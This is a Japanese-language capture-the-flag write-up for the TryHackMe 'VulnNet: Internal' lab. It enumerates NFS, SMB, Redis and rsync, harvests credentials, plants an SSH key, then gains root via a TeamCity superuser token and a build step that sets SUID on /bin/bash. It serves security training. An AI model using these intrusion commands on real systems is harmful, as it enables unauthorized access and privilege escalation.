# VulnNet: Internal CTF

https://tryhackme.com/room/vulnnetinternal

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.211.190
root@ip-10-10-242-178:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-16 00:32 GMT
Nmap scan report for 10.10.211.190
Host is up (0.00016s latency).
Not shown: 65523 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
873/tcp   open     rsync
2049/tcp  open     nfs
6379/tcp  open     redis
9090/tcp  filtered zeus-admin
35489/tcp open     unknown
35727/tcp open     unknown
39319/tcp open     unknown
46553/tcp open     unknown
MAC Address: 02:2F:C7:7F:9F:91 (Unknown)

root@ip-10-10-242-178:~# sudo nmap -sV -p22,111,139,445,873,2049,6379,9090,35489,39319,46553 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-16 00:33 GMT
Nmap scan report for 10.10.211.190
Host is up (0.00032s latency).

PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open     rpcbind     2-4 (RPC #100000)
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
35489/tcp open     mountd      1-3 (RPC #100005)
39319/tcp open     nlockmgr    1-4 (RPC #100021)
46553/tcp open     mountd      1-3 (RPC #100005)
MAC Address: 02:2F:C7:7F:9F:91 (Unknown)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH、SMB、rsync、redis

## NFS

```shell
$ showmount -e 10.10.211.190
Export list for 10.10.211.190:
/opt/conf *
```

マウント

```shell
$ sudo mount -t nfs 10.10.211.190:/opt/conf /mnt
```

ファイル一覧

```shell
$ ls -al `find . -type f`
-rw-r--r-- 1 root root   961 Feb  2  2021 ./hp/hplip.conf
-rw-r--r-- 1 root root   278 Feb  2  2021 ./init/anacron.conf
-rw-r--r-- 1 root root  1444 Feb  2  2021 ./init/lightdm.conf
-rw-r--r-- 1 root root   453 Feb  2  2021 ./init/whoopsie.conf
-rw-r--r-- 1 root root   664 Feb  2  2021 ./profile.d/bash_completion.sh
-rw-r--r-- 1 root root  1003 Feb  2  2021 ./profile.d/cedilla-portuguese.sh
-rw-r--r-- 1 root root   652 Feb  2  2021 ./profile.d/input-method-config.sh
-rw-r--r-- 1 root root  1941 Feb  2  2021 ./profile.d/vte-2.91.sh
-rw-r--r-- 1 root root 58922 Feb  2  2021 ./redis/redis.conf
-rw-r--r-- 1 root root  2469 Feb  2  2021 ./vim/vimrc
-rw-r--r-- 1 root root   662 Feb  2  2021 ./vim/vimrc.tiny
-rw-r--r-- 1 root root  4542 Feb  2  2021 ./wildmidi/wildmidi.cfg
```

sudoで編集可能。

## SMB

共有一覧

```shell
$ enum4linux -S 10.10.211.190

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
shares          Disk      VulnNet Business Shares
IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

sharesに接続

```shell
$ smbclient //10.10.211.190/shares
```

3ファイルをダウンロードした。

```shell
$ ls *.txt                                                                         
business-req.txt  data.txt  services.txt
```

```shell
$ cat business-req.txt                                                                      
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.

$ cat data.txt        
Purge regularly data that is not needed anymore

$ cat services.txt 
THM{.......................}
```

## redis

```shell
$ redis-cli -h 10.10.211.190 -p 6379
10.10.211.190:6379> ping
(error) NOAUTH Authentication required.
```

パスが必要。  
※NFSでマウントした場所

```shell
$ grep pass ./redis/redis.conf
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
requirepass "B65Hx562F@ggAZ@F"
```

認証

```shell
10.10.211.190:6379> auth B65Hx562F@ggAZ@F
OK
10.10.211.190:6379> ping
PONG
10.10.211.190:6379> keys *
1) "authlist"
2) "internal flag"
3) "marketlist"
4) "int"
5) "tmp"
```

```shell
10.10.211.190:6379> GET "internal flag"
"THM{f.....................}"
10.10.211.190:6379> GET "int"
"10 20 30 40 50"
10.10.211.190:6379> GET "tmp"
"temp dir..."
```

```shell
10.10.211.190:6379> LRANGE "authlist" 0 -1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.211.190:6379> LRANGE "marketlist" 0 -1
1) "Machine Learning"
2) "Penetration Testing"
3) "Programming"
4) "Data Analysis"
5) "Analytics"
6) "Marketing"
7) "Media Streaming"
```

base64 -d

```text
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

## rsync

接続

```shell
mkdir ./rsync
echo "Hcg3HP67@TW@Bc72v" > ./.rsync_pass
chmod 600 ./.rsync_pass
rsync -av --password-file=./.rsync_pass rsync://rsync-connect@10.10.211.190 ./rsync

files           Necessary home interaction
```

files をダウンロード

```shell
$ rsync -av --password-file=./.rsync_pass rsync://rsync-connect@10.10.211.190/files ./rsync
```

```shell
$ pwd                  
/home/kali/CTF/rsync/sys-internal

$ ls -al
total 108
drwxr-xr-x 18 kali kali 4096 Feb  6  2021 .
drwxr-xr-x  3 kali kali 4096 Feb  1  2021 ..
lrwxrwxrwx  1 kali kali    9 Feb  1  2021 .bash_history -> /dev/null
-rw-r--r--  1 kali kali  220 Feb  1  2021 .bash_logout
-rw-r--r--  1 kali kali 3771 Feb  1  2021 .bashrc
drwxrwxr-x  8 kali kali 4096 Feb  2  2021 .cache
drwxrwxr-x 14 kali kali 4096 Feb  1  2021 .config
drwx------  3 kali kali 4096 Feb  1  2021 .dbus
drwx------  2 kali kali 4096 Feb  1  2021 Desktop
-rw-r--r--  1 kali kali   26 Feb  1  2021 .dmrc
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Documents
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Downloads
drwx------  3 kali kali 4096 Feb  1  2021 .gnupg
drwxrwxr-x  3 kali kali 4096 Feb  1  2021 .local
drwx------  5 kali kali 4096 Feb  1  2021 .mozilla
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Music
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Pictures
-rw-r--r--  1 kali kali  807 Feb  1  2021 .profile
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Public
lrwxrwxrwx  1 kali kali    9 Feb  2  2021 .rediscli_history -> /dev/null
drwxrwxr-x  2 kali kali 4096 Feb  6  2021 .ssh
-rw-r--r--  1 kali kali    0 Feb  1  2021 .sudo_as_admin_successful
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Templates
drwx------  4 kali kali 4096 Feb  2  2021 .thumbnails
-rw-------  1 kali kali   38 Feb  6  2021 user.txt
drwxr-xr-x  2 kali kali 4096 Feb  1  2021 Videos
-rw-------  1 kali kali   61 Feb  6  2021 .Xauthority
-rw-r--r--  1 kali kali   14 Feb 12  2018 .xscreensaver
-rw-------  1 kali kali 2546 Feb  6  2021 .xsession-errors
-rw-------  1 kali kali 2546 Feb  6  2021 .xsession-errors.old
```

誰かのホームディレクトリ。

```shell
$ cat user.txt     
THM{..........................}
```

ユーザーフラグゲット。

シェル取得を目指す。

公開鍵をauthorized_keysにコピーし、アップロード。  
./rsync ではなく、./rsync/sys-internal になっていることに注意。

```shell
$ cp ./id_rsa_0316.pub ./rsync/sys-internal/.ssh/authorized_keys

$ rsync -av --password-file=./.rsync_pass ./rsync/sys-internal rsync://rsync-connect@10.10.211.190/files
```

アップロードはできたが、ユーザー名が分からない。

```shell
$ more .xsession-errors
dbus-update-activation-environment: setting LANG=en_US.UTF-8
dbus-update-activation-environment: setting GDM_LANG=en_US
dbus-update-activation-environment: setting DISPLAY=:0
dbus-update-activation-environment: setting XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/sys-internal
dbus-update-activation-environment: setting USER=sys-internal
dbus-update-activation-environment: setting DESKTOP_SESSION=Lubuntu
dbus-update-activation-environment: setting PWD=/home/sys-internal
dbus-update-activation-environment: setting HOME=/home/sys-internal
```

sys-internal だった

```shell
$ ssh sys-internal@10.10.211.190 -i ./id_rsa_0316
```

sys-internal で SSH 接続成功！

```shell
sys-internal@vulnnet-internal:~$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
```

## 権限昇格

```shell
sys-internal@vulnnet-internal:~$ find / -perm -u=s -type f -ls 2>/dev/null
   130219     44 -rwsr-xr-x   1 root     root        43088 Mar 15  2018 /bin/mount
   136860     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   130452     64 -rwsr-xr-x   1 root     root        64424 Mar  9  2017 /bin/ping
   136864    144 -rwsr-xr-x   1 root     root       146128 Nov 30  2017 /bin/ntfs-3g
   130204     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2018 /bin/su
   130329     28 -rwsr-xr-x   1 root     root        26696 Mar 15  2018 /bin/umount
   423301    624 -rwsr-xr-x   1 root     root       635312 Feb  1  2021 /usr/local/bin/sudo
   391133     40 -rwsr-xr-x   1 root     root        40344 Jan 25  2018 /usr/bin/newgrp
   396653    148 -rwsr-xr-x   1 root     root       149080 Jan 18  2018 /usr/bin/sudo
   391243     60 -rwsr-xr-x   1 root     root        59640 Jan 25  2018 /usr/bin/passwd
   391239     76 -rwsr-xr-x   1 root     root        76496 Jan 25  2018 /usr/bin/chfn
   409950     20 -rwsr-xr-x   1 root     root        18448 Mar  9  2017 /usr/bin/traceroute6.iputils
   391242     76 -rwsr-xr-x   1 root     root        75824 Jan 25  2018 /usr/bin/gpasswd
   391240     44 -rwsr-xr-x   1 root     root        44528 Jan 25  2018 /usr/bin/chsh
   411888     24 -rwsr-xr-x   1 root     root        22520 Mar 27  2018 /usr/bin/pkexec
   414974    372 -rwsr-xr--   1 root     dip        378600 Mar  3  2018 /usr/sbin/pppd
   395289     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   395149     44 -rwsr-xr--   1 root     messagebus    42992 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    14122     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2018 /usr/lib/policykit-1/polkit-agent-helper-1
   420803    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
   554030    112 -rwsr-xr-x   1 root     root         113336 Jun  9  2020 /sbin/mount.nfs
```

sudo が2つあるのは気になる。

サービス一覧

```shell
sys-internal@vulnnet-internal:~$ systemctl list-units --type=service --state=running
UNIT                        LOAD   ACTIVE SUB     DESCRIPTION                                                     
accounts-daemon.service     loaded active running Accounts Service                                                
acpid.service               loaded active running ACPI event daemon                                               
amazon-ssm-agent.service    loaded active running amazon-ssm-agent                                                
avahi-daemon.service        loaded active running Avahi mDNS/DNS-SD Stack                                         
cron.service                loaded active running Regular background program processing daemon                    
cups.service                loaded active running CUPS Scheduler                                                  
dbus.service                loaded active running D-Bus System Message Bus                                        
getty@tty1.service          loaded active running Getty on tty1                                                   
kerneloops.service          loaded active running Tool to automatically collect and submit kernel crash signatures
lightdm.service             loaded active running Light Display Manager                                           
ModemManager.service        loaded active running Modem Manager                                                   
networkd-dispatcher.service loaded active running Dispatcher daemon for systemd-networkd                          
NetworkManager.service      loaded active running Network Manager                                                 
nfs-blkmap.service          loaded active running pNFS block layout mapping daemon                                
nfs-idmapd.service          loaded active running NFSv4 ID-name mapping service                                   
nfs-mountd.service          loaded active running NFS Mount Daemon                                                
nmbd.service                loaded active running Samba NMB Daemon                                                
polkit.service              loaded active running Authorization Manager                                           
redis-server.service        loaded active running Advanced key-value store                                        
rpcbind.service             loaded active running RPC bind portmap service                                        
rsync.service               loaded active running fast remote file copy program daemon                            
rsyslog.service             loaded active running System Logging Service                                          
serial-getty@ttyS0.service  loaded active running Serial Getty on ttyS0                                           
smbd.service                loaded active running Samba SMB Daemon                                                
ssh.service                 loaded active running OpenBSD Secure Shell server                                     
systemd-journald.service    loaded active running Journal Service                                                 
systemd-logind.service      loaded active running Login Service                                                   
systemd-networkd.service    loaded active running Network Service                                                 
systemd-resolved.service    loaded active running Network Name Resolution                                         
systemd-timesyncd.service   loaded active running Network Time Synchronization                                    
systemd-udevd.service       loaded active running udev Kernel Device Manager                                      
teamcity.service            loaded active running TeamCity Boot                                                   
udisks2.service             loaded active running Disk Manager                                                    
user@1000.service           loaded active running User Manager for UID 1000                                       
user@106.service            loaded active running User Manager for UID 106                                        
whoopsie.service            loaded active running crash report submission daemon                                  
wpa_supplicant.service      loaded active running WPA supplicant                                                  

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

37 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.
```

teamcity が気になる。

```shell
sys-internal@vulnnet-internal:~$ systemctl cat teamcity.service
# /etc/systemd/system/teamcity.service
[Unit]
Description=TeamCity Boot
After=network.target

[Service]
Type=forking

ExecStart=/bin/bash -c "/TeamCity/bin/runAll.sh start"
ExecStop=/bin/bash -c "/TeamCity/bin/runAll.sh stop"

User=root
Group=root
RestartSec=10
Restart=always

[Install]
WantedBy=multi-user.target
```

root実行。TeamCityの代表的なポートは8111であり、ssコマンドで調べると、Localhost向けに 8111ポートが Listenしていることが分かった。

```shell
$ ss
tcp                  CLOSE-WAIT                 1                      0                                                         [::ffff:127.0.0.1]:60427                                          [::ffff:127.0.0.1]:8111                  
tcp                  ESTAB                      0                      0                                                         [::ffff:127.0.0.1]:8111                                           [::ffff:127.0.0.1]:46103 
```

脆弱性検索

```shell
$ searchsploit teamcity                          
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
JetBrains TeamCity 2018.2.4 - Remote Code Execution                                                                                                                                                       | java/remote/47891.txt
JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)                                                                                                                                                | java/remote/51884.py
TeamCity < 9.0.2 - Disabled Registration Bypass                                                                                                                                                           | multiple/remote/46514.js
TeamCity Agent - XML-RPC Command Execution (Metasploit)                                                                                                                                                   | multiple/remote/45917.rb
TeamCity Agent XML-RPC 10.0 - Remote Code Execution                                                                                                                                                       | php/webapps/48201.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

一番新しい 51884.py をターゲットにコピーして実行してみたが、失敗。

```shell
sys-internal@vulnnet-internal:~$ python3 ./51884.py -u http://127.0.0.1:8111

=====================================================
*       CVE-2023-42793                              *
*  TeamCity Admin Account Creation                  *
*                                                   *
*  Author: ByteHunter                               *
=====================================================

Token already exists
Failed to delete the previous token
```

SSHトンネリングを作成

```shell
# kali
$ ssh -i ./id_rsa_0316 sys-internal@10.10.211.190 -L 8111:127.0.0.1:8111
```

kaliで、http://127.0.0.1:8111 にアクセスしたらログイン画面が表示された。

/TeamCity/logs ディレクトリで password を検索したら、下記が出てきた。

```shell
sys-internal@vulnnet-internal:/TeamCity/logs$ find . -type f -exec grep -i -I "password" {} /dev/null \; 2>/dev/null
./catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
./catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
./catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
./catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
./catalina.out:[TeamCity] Super user authentication token: 8274978257233072623 (use empty username with the token as the password to access the server)
```

一番下のトークンを指示通りに使ってログインできた。

- Manually で新規プロジェクトを作成
- build設定を作成
- バージョンコントロール設定スキップ
- ビルドステップ「コマンドライン」でコマンドを保存

```shell
chmod +s /bin/bash
```

- 画面右上のRunボタンを押す

```shell
sys-internal@vulnnet-internal:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```

SUIDが付いた。

```shell
sys-internal@vulnnet-internal:~$ bash -p
bash-4.4# id
uid=1000(sys-internal) gid=1000(sys-internal) euid=0(root) egid=0(root) groups=0(root),24(cdrom),1000(sys-internal)
```

rootシェル取得成功。

```shell
bash-4.4# cat /root/root.txt
THM{.....................}
```

ルートフラグゲット！

## 振り返り

- どう考えても Easy ではない。
- NFS、SMB、redis、rsync のサービス祭り。rsync は初めて使った。
- 今後、TeamCity が目に入ったらピンとくると思う。
- 一度中断したら rsync で SSHキーを配置するところからやり直しが必要なところも鬼。
